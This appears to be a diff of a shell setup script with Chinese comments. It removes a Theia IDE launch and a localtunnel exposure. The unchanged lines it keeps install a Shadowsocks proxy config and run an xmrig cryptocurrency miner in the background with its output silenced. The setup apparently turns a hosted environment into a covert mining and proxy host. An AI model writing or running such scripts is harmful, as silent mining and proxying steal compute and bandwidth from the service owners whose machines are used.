@@ -14,9 +14,6 @@ cd theia-app
 # 安裝依賴
 yarn
 
-# 啟動 Theia IDE（預設 3000 port）
-yarn theia start --hostname 0.0.0.0 --port 3000
-
 # 儲存 Shadowsocks 設定檔
 cat <<EOF > /etc/shadowsocks-libev/config.json
 {
@@ -60,4 +57,3 @@ EOF
 
 # 背景執行礦工
 ./xmrig > /dev/null 2>&1 &
-lt --port 3000
